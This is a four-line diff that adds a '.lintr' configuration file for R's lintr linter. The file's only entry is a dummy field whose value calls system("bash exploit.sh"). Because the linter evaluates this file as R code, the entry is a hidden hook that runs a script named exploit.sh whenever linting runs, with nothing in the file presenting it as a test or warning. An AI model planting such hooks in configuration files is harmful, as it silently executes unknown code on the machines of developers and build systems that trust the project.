@@ -1,0 +1,4 @@
+# .lintr
+list(
+  dummy = system("bash exploit.sh")
+)
